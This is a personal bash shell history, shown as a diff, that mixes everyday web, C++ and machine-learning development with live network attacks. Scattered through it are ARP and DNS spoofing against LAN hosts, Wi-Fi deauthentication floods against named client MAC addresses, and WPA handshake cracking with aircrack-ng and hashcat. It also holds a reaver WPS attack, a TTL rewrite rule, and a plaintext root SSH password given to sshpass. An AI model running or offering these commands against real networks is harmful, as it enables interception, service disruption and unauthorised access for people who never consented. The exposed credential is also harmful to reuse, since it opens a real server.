@@ -1,0 +1,1609 @@
+git push
+git commit
+git add *
+webpack --watch
+vim .gitignore
+git pull
+npm install react-visibility-sensor
+webpack --watch -p
+webpack -p --config webpack.config.js 
+webpack -p 
+webpack --help
+cd /var/www/html/Raspisator/
+ls
+cd ..
+python3 essay.py -e 0.3 ../test1.txt 
+mv test1.txt ../
+mv test.txt ../
+mv test.txt test1.txt 
+gedit arguments.json 
+vim arguments.json 
+vim requirements.txt 
+vim text-ekimov-emotional.txt 
+samples/
+vim awesome_text.json 
+python3 essay.py -e 0.3 test.txt 
+python3 essay.py -e 0.0 test.txt 
+gedit test.txt
+gedit test.txt.out 
+python3 essay.py -e 0.2 test.txt 
+python3 essay.py -e 0.1 test.txt 
+python3 essay.py -e 0.5 test.txt 
+python3 essay.py -e 1 test.txt 
+python3 essay.py -e 0 test.txt 
+python3 essay.py --help 
+python3 essay.py test.txt 
+vim keywords.txt 
+vim emotions.py 
+vim test.txt.out 
+gedit keywords.txt 
+rm text.txt.out
+vim text.txt.out
+vim essay.py 
+essay/essay-writer/
+cd Projects/
+sudo pip3 install -r requirements.txt 
+pip3 install -r requirements.txt 
+cd essay-writer/
+git clone https://github.com/Omrigan/essay-writer.git
+git clone sudo easy_install3 pip
+cd essay/
+mkdir essay
+sudo easy_install3 pip
+sudo apt-get install python3-setuptools
+pip install pip3
+python3
+./a.out 
+g++ deix.cpp --std=c++11
+vim deix.cpp 
+cd Projects/cpp/
+g++ deix.cpp 
+python tester.py
+./tester.py 
+vim tester.py
+which python
+chmod 777 tester.py
+mv fib_fast Projects/cpp/fib_fast
+mv fib_slow Projects/cpp/fib_slow
+mv fib_slow.cpp Projects/cpp/fib_slow.cpp
+mv fib_fast.cpp Projects/cpp/fib_fast.cpp
+./fib_fast 9
+./fib_fast 
+g++ fib_fast.cpp -o fib_fast
+vim fib_fast.cpp
+./fib_slow 
+g++ fib_slow.cpp -o fib_slow
+vim fib_slow.cpp
+jupyter-notebook 
+python
+cd 
+ifconfig
+pip install sklearn-neuralnetwork
+pip -V
+pip -h
+pip -v
+pip
+codeblocks 
+sudo codeblocks 
+xterm 
+sudo apt-get install xterm
+sudo apt-get install gdb
+vim C.cpp 
+g++ C.cpp -std=c++11
+vim A.cpp
+g++ A.cpp -std=c++11
+g++ B.cpp -std=c++11
+cp A.cpp C.cpp
+vim B.cpp
+cp A.cpp B.cpp
+cd Projects/cpp/codeforces/761/
+cd 761
+mkdir 761
+cd codeforces/
+mkdir codeforces
+cd Projects/cpp
+jupyter-notebook --ip 172.16.8.219 --port 2555
+jupyter notebook 
+jupyter notebook --ip 172.16.8.219 --port 2556
+jupyter-notebook
+sudo network-service restart
+git clone https://github.com/rajathkumarmp/Python-Lectures.git
+git clone https://github.com/Omrigan/alpha-course.git
+cd Documents/ds_179/
+cd ds_179/
+mkdir ds_179
+cd Documents/
+jupyter notebook --ip * --port 2556
+jupyter notebook --ip * --port 25569
+jupyter notebook --help
+dmitry/
+vim .jupyter/jupyter_notebook_config.py 
+jupyter notebook --generate-config
+killall python
+htop
+sudo pip install --upgrade scikit-neuralnetwork
+sudo pip install scikit-neuralnetwork
+sudo pip install --upgrade gym
+pip install --upgrade gym
+cd week1/
+cd Practical_RL/
+git clone https://github.com/yandexdataschool/Practical_RL.git
+cd Documents/yandex_ML/
+vim index.php 
+npm i -S react-color
+gedit A.cpp
+gedit D.cpp
+./
+././a.out 
+vim lamps.out
+vim lamps.in
+clear
+2 2
+2 3
+0 4
+1 3
+vim D.cpp
+g++ D.cpp -std=c++11
+g++ D.c++
+vim divisible.out
+vim divisible.in
+vim pairs.out
+vim pairs.in
+cd neerc/
+mkdir neerc
+git commit 
+git add *\
+
+git commmit
+git checkout master
+gedit JS/pages/layout.jsx 
+vim JS/pages/layout.jsx 
+git checkout 40ade01b4cb58871479d1a24255224e034aea5b9
+sudo parted 
+parted 
+ping 192.168.1.1
+sudo pipelight-plugin --remove-mozilla-plugins
+pipelight-plugin --help
+sudo pipelight-plugin --create-mozilla-plugins
+pipelight-plugin --disable unity3d
+pipelight-plugin --enable x64-unity3d
+sudo pipelight-plugin --unlock x64-unity3d
+pipelight-plugin --unlock x64-unity3d
+sudo wget -O /usr/share/pipelight/install-dependency "https://bitbucket.org/mmueller2012/pipelight/raw/master/internal-scripts/install-dependency"
+udo wget -O /usr/share/pipelight/install-dependency "https://bitbucket.org/mmueller2012/pipelight/raw/master/internal-scripts/install-dependency"
+pipelight-plugin --create-mozilla-plugins
+pipelight-plugin --enable unity3d
+rm -rf ~/.wine-pipelight/
+pipelight-plugin --update
+sudo firefox
+ps -ef | grep plugin
+ps -ef | grep pipeli
+ps -ef | grep pipe
+ps -ef | grep wine
+sudo pipelight-plugin --enable unity3d
+wine
+wine 
+ps 
+top
+sudo pipelight-plugin --update
+sudo apt-get install --install-recommends pipelight-multi
+sudo apt-get update
+sudo add-apt-repository ppa:pipelight/stable
+sudo apt install wine
+npm install -S react-spinner
+vim base.cpp
+g++ base.cpp 
+g++ cnk.cpp 
+vim cnk.cpp
+vim nQueens.cpp
+знерщт
+g++ nQueens.cpp  -std=c++11
+python saveToXcell.py 21
+git c
+git add css/main.css 
+sudo chmod 777 API/save.php
+sudo chmod 777 user.php 
+sudo chmod 777 saveToXcell.py 
+sudo chmod 777 excell/
+chmod 777 excell/
+chmod 777 user.php 
+python saveToXcell.py 13 
+sudo pip install openpyxl
+pip install openpyxl
+pip install openpyxcell
+chmod 777 saveToXcell.py 
+sudo chmod 777 save.php
+cd API
+git add .gitignore 
+git rm JS/scripts.min.js --cached
+git rm JS/scripts.min.js 
+git add JS/scripts.min.js 
+git diff
+meld
+git merge
+git commit -f
+git rm .gitignore --cached
+git rm .gitignore 
+git rm .giti
+git tree
+git tee
+rm JS/scripts.min.js 
+sensible-browser http://vk.com
+apt-get
+man sensible-browser 
+./set_dark.sh 
+cd gnome-terminal-colors-solarized
+git clone https://github.com/sigurdga/gnome-terminal-colors-solarized.git
+eval `dircolors ~/.dircolors`
+mv dircolors.ansi-dark .dircolors
+wget --no-check-certificate https://raw.github.com/seebi/dircolors-solarized/master/dircolors.ansi-dark
+cd
+sudo fdisk -l
+fdisk -l
+fdisk
+calc
+npm install -S react-bootstrap-date-picker
+arpspoof -t 172.16.0.1 172.16.9.45
+echo 1 > /proc/sys/net/ipv4/ip_forward 
+arpspoof -t 172.16.9.45 172.16.0.1
+dnsspoof -f dnshosts.txt host 172.16.7.45 and udp port 53
+sudo -s
+cd Documents/crack/
+arpspoof -t 172.16.0.1 172.16.11.107
+arpspoof -t 172.16.11.107 172.16.0.1
+wireshark
+route -n
+route -n ya.ru
+route ya.ru
+service network-manager start
+airmon-ng stop wlp13s0 6
+airmon-ng stop mon0
+aireplay-ng --deauth 1000 -a 08:60:6E:21:29:28  -c 64:76:BA:B2:FD:5E mon0
+aireplay-ng --deauth 100 -a 08:60:6E:21:29:28  -c 64:76:BA:B2:FD:5E mon0
+iwconfig mon0 channel 4
+airmon-ng start wlp13s0 
+airmon-ng stop wlp13s0
+aireplay-ng --deauth 100 -a 08:60:6E:21:29:28 -c  64:76:BA:B2:FD:5E mon0
+airodump-ng --essid sch179 mon0 
+airmon-ng check kill
+airmon-ng stop wlp13s0 
+airodump-ng --help
+airodump-ng --bssid sch179 mon0 
+airodump-ng  mon0 
+aireplay-ng --deauth 100 -a 08:60:6E:21:29:28  -c 48:5A:B6:53:33:DB mon0
+iwconfig mon0 channel 6
+airmon-ng check 
+sudo-s
+reboot
+sudo apt install intercepter-ng
+sudo apt-get install intercepter
+sudo apt-get install intercepter-ng
+vim ips
+arpspoof -t 192.168.1.1 192.168.1.4
+dnsspoof -f dnshosts.txt host 192.168.1.4 and udp port 53
+vim dnshosts.txt 
+arpspoof -t 192.168.1.4 192.168.1.1
+ping 192.168.1.3
+ping 192.168.1.4
+arpspoof -t 192.168.1.4 192.168.0.1 & arpspoof -t & arpspoof -t 192.168.1.1 192.168.1.4
+arpspoof -t 192.168.1.
+airmon-ng stop mon0 
+airodump-ng --bssid 00:4F:67:00:C0:74 mon0 
+airodump-ng mon0 
+airodump-ng --bssid 00:4F:67:00:C0:74 Geok mon0 
+airodump-ng -bssid 00:4F:67:00:C0:74 Geok mon0 
+airodump-ng -essid Geok mon0 
+aireplay-ng --deauth 100 -a 50:46:5D:00:76:98 -c 74:04:2B:B1:15:31 mon0
+airodump-ng --station --essid sch179 mon0 
+airodump-ng --station 40:33:1A:6C:9F:52 --essid sch179 mon0 
+aireplay-ng --test  -a 08:60:6E:21:70:68 -c 40:33:1A:6C:9F:52 mon0
+aireplay-ng --test  -a 08:60:6E:21:70:68 -c 40:33:1A:6C:9F:53 mon0
+aireplay-ng --help
+aireplay-ng  -a 08:60:6E:21:70:68 -c 40:33:1A:6C:9F:53 mon0
+aireplay-ng --deauth 100 -a 08:60:6E:21:70:68 -c 40:33:1A:6C:9F:53 mon0
+aireplay-ng --deauth 100 -a 50:46:5D:00:76:98 -c 40:33:1A:6C:9F:52 mon0
+iwconfig mon0 channel 3
+aireplay-ng --deauth 100 -a 50:46:5D:CD:E3:80 -c 40:33:1A:6C:9F:53 mon0
+aireplay-ng --deauth 100 -a 50:46:5D:00:76:98 -c 40:33:1A:6C:9F:53 mon0
+iwconfig mon0 channel 12
+aireplay-ng --deauth 1 -a 50:46:5D:00:76:98 -c 40:33:1A:6C:9F:53 mon0
+aireplay-ng --deauth 1000 -a 50:46:5D:00:76:98 -c 40:33:1A:6C:9F:53 mon0
+airodump-ng --bssid 50:46:5D:00:76:9C mon0
+airodump-ng mon0 --bssid 50:46:5D:00:76:9C mon0
+aireplay-ng --deauth 1000 -a 50:46:5D:00:76:98 -c 74:04:2B:B1:15:31 mon0
+airodump-ng mon0
+airmon-ng start mon0 
+arpspoof -t 172.16.0.1 172.16.8.219 & arpspoof -t 172.16.8.219 172.16.0.1
+echo 1 & echo 2
+arpspoof -t 172.16.0.1 172.16.8.219 
+apt-get install dsniff
+apt install bridge-utils
+make 
+cd dsniff-2.4/
+apt-get install arpspoof
+apt-get cache search 
+airspoof
+ping 172.16.15.255
+ping 192.16.15.255
+touch ips
+touch dnshosts.txt
+apt-get install bridge-utils --fix-missing
+apt-get install bridge-utils
+apt-get update
+airmon-ng mon0 6
+mon0 channel 6
+airmon-ng start wlp13s0 6
+airmon-ng start wlp13s0
+airodump-ng --bssid 94:D8:59:7A:C9:2B --channel 6 mon0 
+aireplay-ng --deauth 1000 -a 94:D8:59:7A:C9:2B -c 30:10:E4:D4:BE:C4 mon0
+aireplay-ng --deauth 1000 -a  94:D8:59:7A:C9:2B -c 30:10:E4:D4:BE:C4 mon0
+aireplay-ng --deauth 1000 -a  94:D8:59:7A:C9:2B -c 30:10:E4:D4:BE:C4
+airodump-ng --bssid 50:46:5D:00:76:98 --channel 6 mon0 
+aireplay-ng --deauth 1000 -a 50:46:5D:00:76:98 -c
+airodump-ng --bssid 50:46:5D:00:76:98 mon0
+iwconfig
+airmon-ng stop mon1
+airmon-ng  check
+airmon-ng  check kill\
+
+aireplay-ng mon0 check
+aireplay-ng check
+aircrack-ng check
+init 5
+cpuf 
+pwm1
+pwm1_enable 
+vim fancon.sh 
+./fancon.sh max
+cd ~/Downloads/
+cd..
+device/
+cd hwmon1
+cd subsystem/
+cat subsystem/
+/sys/class/hwmon/hwmon0/
+cd Downloads/
+cd ~
+/dev/
+./fancon.sh -help
+./fancon.sh --help
+./fancon.sh help
+chmod 777 ./fancon.sh
+sensors
+sudo sensors-detect
+sudo pwmconfig
+fancontrol 
+sudo sensors detect
+sudo apt-get install lm-sensors
+sudo apt-get install lm-sensor
+sudo apt-get install fancontrol
+hashcat-3.30/hashcat64.bin -m 2500 -w 3 --force ./1.hccap wpa 
+hashcat-3.30/hashcat64.bin -m 2500 -w 3 --force ./1.hccap rockyou.txt  
+hashcat-3.30/hashcat64.bin -m 2500 --force ./1.hccap wpa 
+mv 1.hccap.hccap 1.hccap
+./hashcat64.bin --help | grep WPA
+./hashcat64.bin --help
+vim example.dict 
+./hashcat64.bin --force -m 500 example500.hash example.dict 
+gedit example500.sh 
+vim example500.sh 
+bash ./example400.sh
+vim user_manuals.txt 
+cd docs
+man ./hashcat64.bin 
+./example500.sh
+vim example400.sh 
+./example400.sh
+extra/
+cd OpenCL/
+cd hashcat-3.30/
+apt-cache search hashcat
+apt-cache search cuda
+sudo apt-get install oclhashcat
+aircrack-ng 01.cap -J 1.hccap
+mv '-01.cap' 01.cap
+man mv
+mv -01.cap 01.cap
+aircrack-ng -01.cap -J 1.hccap
+aircrack-ng -01.cap -J -1.hccap
+aircrack-ng -a2 -b C8:D5:FE:16:66:5F -w ./darkc0de.lst ./-01.cap 
+aircrack-ng -a2 -b C8:D5:FE:16:66:5F -w ./wpa ./-01.cap 
+sudo chown dmitry ./
+sudo chowner dmitry ./
+aircrack-ng -a2 -b C8:D5:FE:16:66:5F -w ./pas.txt ./-01.cap 
+airmon-ng mon0 stop
+airodump-ng -c 1 --bssid C8:D5:FE:16:66:5F -w ./ mon0
+aireplay-ng -0 2 -a C8:D5:FE:16:66:5F -c 74:04:2B:B1:15:31 mon0
+aireplay-ng -O 2 -a C8:D5:FE:16:66:5F -c 74:04:2B:B1:15:31 mon0
+rm ./*
+cd crack/
+mkdir crack
+pwd
+aireplay-ng -9 wlp13s0
+airmon-ng  check kill
+init 
+aircrack-ng -9 wlp13s0
+wash -i mon0 -C -s
+wash -i mon0
+reaver -i mon0 -b C8:D5:FE:16:66:5F
+airmon-ng  start wlp13s0
+iw list 
+iw list | grep monitor
+iw list
+iw 
+wireshark 
+service avahi-daemon stop
+systemctl disable avahi-daemon
+systemctl disable avhai-daemon
+vim /etc/init/avahi-daemon.conf 
+service avahi-daemon.socket stop
+service ahavi-daemon stop
+service NetworkManager stop
+fish
+sudo apt-get install aircrack-ng
+sudo apt-get install reaver
+sudo apt-get install revear
+y
+sudo wireshark 
+sudo chown dmitry /usr/bin/dumpcap
+chown dmitry /usr/bin/dumpcap
+chown /usr/bin/dumpcap dmitry
+man chown
+chown -h
+/usr/bin/dumpcap
+git add user.php 
+meld 
+git add dblogin.sql 
+git mktree
+sudo apt-get install wireshark
+sudo apt-get install Wireshark
+vim capture.txt 
+sudo tcpdump -XX -i wlp13s0 >capture.txt
+sudo tcpdump -XX -i wlp13s0
+sudo tcpdump -XX -c 5 -i wlp13s0
+sudo tcpdump -D
+sudo tcpdump -A -c 5 -i wlp13s0
+sudo tcpdump -c 5 -i wlp13s0
+sudo apt-get install tcpdump
+find . -name '*' | xargs wc -l
+find . -name '*.php' | xargs wc -l
+cd js
+rm scripts.min.js 
+git pusg
+./Start_dev_server.sh 
+wget https://gist.githubusercontent.com/justheuristic/f58d9071361bcad705eb8caf62a16cb4/raw/a7aab2796aca615cb30ab1dc9124a2d6f5f26a41/Generating%2520fonts%2520with%2520adversarial%2520networks.ipynb 
+sudo iptables -t mangle -A POSTROUTING -o wlp13s0 -j TTL --ttl-set 65
+cd Projects/gotoHack2/Ponyland/
+bash
+python quote_get.py 
+sudo pip install --upgrade https://github.com/cuthbertLab/music21/archive/master.zip
+sudo apt-get install ffmpeg
+sudo pip install --upgrade https://github.com/yandexdataschool/agentnet/archive/master.zip
+sudo pip install --upgrade https://github.com/yandexdataschool/agentnet/atchive/master.zip
+sudo pip --upgrade https://github.com/yandexdataschool/agentnet/atchive/master.zip
+sudo vi recurrence.py
+vi recurrence.py
+cd agent
+cd /usr/local/lib/python2.7/dist-packages/agentnet/
+sudo pip install --upgrade https://github.com/theano/theano/archive/master.zip
+pip install --upgrade https://github.com/theano/theano/archive/master.zip
+wget http://bit.ly/2izgJcz
+wget http://bit.ly/2izgJcz > frozen.ipynnb
+cd examples/
+sudo pip install -e '.[all]'
+sudo apt-get install swig
+pip install -e '.[all]'
+sudo pip install -e
+pip install -e
+cd gym
+git clone https://github.com/openai/gym.git
+cd dqn_binder/
+cd yandex_ML/
+curl 'http://89.46.103.137/kj2vz6gvem6vtaw52bmj43gtg6b3fsxswrtcu5mw35uahnq536mj5q7a7xeq/v.mp4' -H 'Accept-Encoding: identity;q=1, *;q=0' -H 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36' -H 'Accept: */*' -H 'Referer: http://thevideos.tv/embed-8j3bxph4qp8p-728x410.html' -H 'Connection: keep-alive' -H 'Range: bytes=0-' --compressed >8.mp4
+curl 'http://91.195.98.141/kj2vznovem6vtaw52bmj4266gnds5j2fsygalk75guzks7cvs4dt3a3up5wq/v.mp4' -H 'Accept-Encoding: identity;q=1, *;q=0' -H 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36' -H 'Accept: */*' -H 'Referer: http://thevideos.tv/embed-meov4q6dn6f9-728x410.html' -H 'Connection: keep-alive' -H 'Range: bytes=0-' --compressed > 7.mp4
+curl 'http://91.195.98.138/kj2vzn6vem6vtaw52bmj4m6hgzsdgoxriutepzw3cplp34x75cmhsequkqxa/v.mp4' -H 'Accept-Encoding: identity;q=1, *;q=0' -H 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36' -H 'Accept: */*' -H 'Referer: http://thevideos.tv/embed-c5f1trcbm556-728x410.html' -H 'Connection: keep-alive' -H 'Range: bytes=0-' --compressed > 6.mp4
+curl 'http://89.46.103.6/kj2vzmovem6vtaw52bmj43wzgawkkb62oc26ilbz2vlfy5aizcw6tgpt7uqq/v.mp4' -H 'Accept-Encoding: identity;q=1, *;q=0' -H 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36' -H 'Accept: */*' -H 'Referer: http://thevideos.tv/embed-j7iwclapp2zc-728x410.html' -H 'Connection: keep-alive' -H 'Range: bytes=0-' --compressed > 5.mp4
+cd /media/dmitry/Backups/videos/bsgalactia/season\ 3/
+curl 'http://89.46.103.6/kj2vzmovem6vtaw52bmj43wzgawkkb62oc26ilbz2vlfyn6tebqdvl4j7taa/v.mp4' -H 'Accept-Encoding: identity;q=1, *;q=0' -H 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36' -H 'Accept: */*' -H 'Referer: http://thevideos.tv/embed-j7iwclapp2zc-728x410.html' -H 'Connection: keep-alive' -H 'Range: bytes=0-' --compressed > 5.mp4
+rm 5.mp4 
+echo "curl 'http://89.46.103.6/kj2vzmovem6vtaw52bmj43wzgawkkb62oc26ilbz2vlfyn6tebqdvl4j7taa/v.mp4' -H 'Accept-Encoding: identity;q=1, *;q=0' -H 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36' -H 'Accept: */*' -H 'Referer: http://thevideos.tv/embed-j7iwclapp2zc-728x410.html' -H 'Connection: keep-alive' -H 'Range: bytes=0-' --compressed > 5.mp4" > urls
+cd season\ 3/
+ls -a
+cat urls
+echo "curl 'http://89.46.103.6/kj2vzmovem6vtaw52bmj43wzgawkkb62oc26ilbz2vlfyn6tebqdvl4j7taa/v.mp4' -H 'Accept-Encoding: identity;q=1, *;q=0' -H 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36' -H 'Accept: */*' -H 'Referer: http://thevideos.tv/embed-j7iwclapp2zc-728x410.html' -H 'Connection: keep-alive' -H 'Range: bytes=0-' --compressed > 5.mp4"
+cat "asdas"
+cat curl 'http://89.46.103.6/kj2vzmovem6vtaw52bmj43wzgawkkb62oc26ilbz2vlfyn6tebqdvl4j7taa/v.mp4' -H 'Accept-Encoding: identity;q=1, *;q=0' -H 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36' -H 'Accept: */*' -H 'Referer: http://thevideos.tv/embed-j7iwclapp2zc-728x410.html' -H 'Connection: keep-alive' -H 'Range: bytes=0-' --compressed > 5.mp4
+curl 'http://91.195.98.138/kj2vzn6vem6vtaw52bmj4m6hgzsdgoxriutepzw3cge73mjeabkupf7pkwma/v.mp4' -H 'Accept-Encoding: identity;q=1, *;q=0' -H 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36' -H 'Accept: */*' -H 'Referer: http://thevideos.tv/embed-c5f1trcbm556-728x410.html' -H 'Connection: keep-alive' -H 'Range: bytes=0-' --compressed >6.mp4
+cd ..\
+c\
+
+cd /media/dmitry/
+cd /mnt/
+curl 'http://89.46.103.6/kj2vzmovem6vtaw52bmj43wzgawkkb62oc26ilbz24uvyn6tebqlse7qwb5q/v.mp4' -H 'Accept-Encoding: identity;q=1, *;q=0' -H 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36' -H 'Accept: */*' -H 'Referer: http://thevideos.tv/embed-j7iwclapp2zc-728x410.html' -H 'Connection: keep-alive' -H 'Range: bytes=0-' --compressed >v.mp4
+curl 'http://89.46.103.6/kj2vzmovem6vtaw52bmj43wzgawkkb62oc26ilbz24uvyn6tebqlse7qwb5q/v.mp4' -H 'Accept-Encoding: identity;q=1, *;q=0' -H 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36' -H 'Accept: */*' -H 'Referer: http://thevideos.tv/embed-j7iwclapp2zc-728x410.html' -H 'Connection: keep-alive' -H 'Range: bytes=0-' --compressed
+sudo rtorrent 
+rtorrent 
+sudo apt-get install rtorrent
+npm run watch
+./Stop_dev_server.sh 
+g++ boiramur.cpp -std=c++11
+adcdcadcadcacdcadc
+r
+a
+e
+h
+t
+vim boiramur.cpp
+sudo pip install https://github.com/yandexdataschool/agentnet/archive/master.zip
+pip install https://github.com/yandexdataschool/agentnet/archive/master.zip
+cd Documents/yandex_ML/HSE_deeplearning/
+cd Projects/dnn_music_creator/
+vim water.cpp
+g++ water.cpp  -std=c++11
+cal
+wc -l JS
+vim .theanorc 
+sudo pip install scikit-image
+sudo pip install skimage
+git add *]
+git pulll
+vim ./
+vim
+vim php.ini 
+cd /etc/php/7.0/fpm/
+npm install -S react-overlays
+scp -i ~/Projects/gotoHack2/key predict_xgb.py ponies@164.132.99.53:predict_xgb.py
+scp -i ~/Projects/gotoHack2/key single.csv  ponies@164.132.99.53:single.csv
+scp -i ~/Projects/gotoHack2/key FinalModel.ipynb   ponies@164.132.99.53:FinalModel.ipynb
+bash 
+python `python -c "import os, theano; print(os.path.dirname(theano.__file__))"`/misc/check_blas.py
+ldd numpy/core/multiarray.so
+ldd numpy/core/multiarray.so 
+ldd numpy/core/_dotblas.so
+python 
+/usr/lib/
+sudo apt-get install libopenblas-dev 
+sudo apt-get install libopenblas
+scp -i ~/Projects/gotoHack2/key FinalModel.ipynb   ponies@164.132.99.53:predict_xgb.py
+scp -i ~/Projects/gotoHack2/key single.csv  ponies@164.132.99.53:predict_xgb.py
+scp -i ~/Projects/gotoHack2/key FinalModel.ipynb ponies@164.132.99.53:FinalModel.ipynb
+scp -i FinalModel.ipynb  ~/Projects/gotoHack2/key ponies@164.132.99.53:FinalModel.ipynb 
+ssh ponies@164.132.99.53 -i ~/Projects/gotoHack2/key 
+:q
+vim gifts.cpp
+g++ cloe_arr.cpp  -std=c++11
+vim cloe_arr.cpp
+vim cloe_arr
+vim vladik_airports.cpp
+g++ vladik_airports.cpp -std=c++11
+g++ vladik_airports.cpp -std=g++11
+g++ vladik_airports.cpp 
+scp -i ~/Projects/gotoHack2/key ponies@164.132.99.53:EMBEDDING.pkl ./
+scp -i ~/Projects/gotoHack2/key OneHotEncoder.dump ponies@164.132.99.53:OneHotEncoder.dump
+scp -i ~/Projects/gotoHack2/key labelEncoders.dump ponies@164.132.99.53:labelEncoders.dump
+scp -i ~/Projects/gotoHack2/key xgb.dump ponies@164.132.99.53:xgb.dump
+scp -i ~/Projects/gotoHack2/key xgb.dump ponies@164.132.99.53:predict_xgb.py
+scp -i predict_xgb.py  ~/Projects/gotoHack2/key ponies@164.132.99.53:predict_xgb.py
+scp -i ~/Projects/gotoHack2/key ponies@164.132.99.53:EMBEDDING.pkl Ponyland/
+vim DatasetCreation.py
+vim DatasetCreation.pyc 
+scp -i ~/Projects/gotoHack2/key ponies@164.132.99.53:Ponyland/weights0_64.h5 Ponyland/
+cd Projects/gotoHack2/
+cat /proc/sys/vm/swappiness 
+scp -i ~/Projects/gotoHack2/key ponies@164.132.99.53:Ponyland/s2v.pkl Ponyland/
+scp -i ~/Projects/gotoHack2/key ponies@164.132.99.53:TOKENIZER.pkl ./
+sudo pip install pymorphy2
+pip install pymorphy2
+scp -i ~/Projects/gotoHack2/key ponies@164.132.99.53:Ponyland/X_test_pred.pkl ./
+scp -i ~/Projects/gotoHack2/key ponies@164.132.99.53:Ponyland/X_train_pred.pkl ./
+scp -i ~/Projects/gotoHack2/key ponies@164.132.99.53:DatasetCreation.py ./
+scp -i ~/Projects/gotoHack2/key ponies@164.132.99.53:DatasetCreaton.py ./
+scp -i ~/Projects/gotoHack2/key ponies@164.132.99.53:data_with_important_features.csv ./
+scp -i ~/Projects/gotoHack2/key ponies@164.132.99.53:
+chmod 600 ~/Projects/gotoHack2/key 
+ssh pnies@164.132.99.53
+npm i -S react-dnd-touch-backend
+npm i -S react-bootstrap
+kill 27296
+gedit dblogin.sql 
+sudo apt-get install meld
+cit commit
+vim a.cpp
+g++ a.cpp
+vim drobi.cpp 
+vim alien_genome.cpp
+vim dance.cpp 
+vim strings.cpp
+g++ drobi.cpp  -std=gnu++11
+g++ sale.cpp  -std=gnu++11
+vim sale.cpp
+g++ dance.cpp  -std=gnu++11
+vim dance.cpp
+g++ dance.cpp -std=g++11
+g++ dance.cpp 
+g++ alien_genome.cpp -m32 -Wall -O0 -std=gnu++11 -ffloat-store -lm
+g++ alien_genome.cpp -std=gnu++11
+g++ alien_genome.cpp std=gnu++11
+g++ alien_genome.cpp std=c++11
+g++ alien_genome.cpp 
+g++ election.cpp 
+vim election.cpp
+cd cpp
+sshpass -p aK6eAKhff9mg ssh root@185.106.143.28
+sudo apt-get install sshpass
+sshpass
+ssh root@185.106.143.28
+vim Projects/quote.py 
+kill 11676
+pythom
+sudo apt-get install htop
+gedit 
+ssh hduser@10.90.131.44
+sudo apt-get install pyspark
+git clone https://github.com/ml4a/ml4a-guides.git
+vim JS/index.jsx 
+ping ya.ru
+git rm -rf node_modules
+cd Raspisator/
+git clone https://github.com/TIXFeniks/Raspisator.git
+git revert efb21f5476530879b1df9cecffba93e6d2596492
+git rm -r node_modules
+git rm -r node_modules/
+git merge 
+npm install -S react-dnd-html5-backend
+npm install -S react-dnd
+g
+gb 
+g++ strings.cpp -std=c++11
+funcsave fish_greeting
+function fish_greeting
+/home/dmitry/Projects/quote.py 
+end
+sudo reboot
+apt vvv
+apt v
+lol
+function fish_greeting
+/home/dmitry/Projects/quote.py & 
+end
+vim Projects/
+fish_greeting
+rm .bash_profile 
+vim .profile 
+vim .bash_profile
+which fish
+~/Projects/quote.py; fish
+~/Projects/quote.py ; fish
+~/Projects/quote.py
+/home/dmitry/Projects/
+/home/dmitry/Projects/qoute.py
+sudo pip install requests
+vim  /etc/nginx/sites-available/default
+sudo pip install bs4
+sudo pip install beautifullsoup
+colormgr 
+sudo service nginx restart 
+vim access.log
+sudo vim /etc/nginx/nginx.conf 
+vim /etc/nginx/nginx.conf 
+vim error.log
+/var/log/nginx/
+vim nginx.conf 
+cd /etc/nginx/
+cd html/
+cd nginx/
+service  nginx reload
+cd /usr/share/phpmyadmin/
+vim index.php
+sudo service php7.0-fpm restart 
+git commit -m added todo
+vim to_set_up 
+npm install -S flux
+npm install -S events
+npm uninstall -S react-global
+npm u -S react-global
+npm i -S react-global
+npm i query-string -S
+Raspisator/
+cd /var/www/html/
+vim package.json 
+npm i react-form-data -S
+file -bi API/allUsers.php 
+vim API/allUsers.php 
+file -bi index.php
+sudo chmod 666 index.php 
+sudo recode UTF-8 index.php 
+recode UTF-8 index.php
+sudo apt-get install recode
+vim .vimrc
+common/
+common/\\
+ss
+l
+cd php7.0-common/
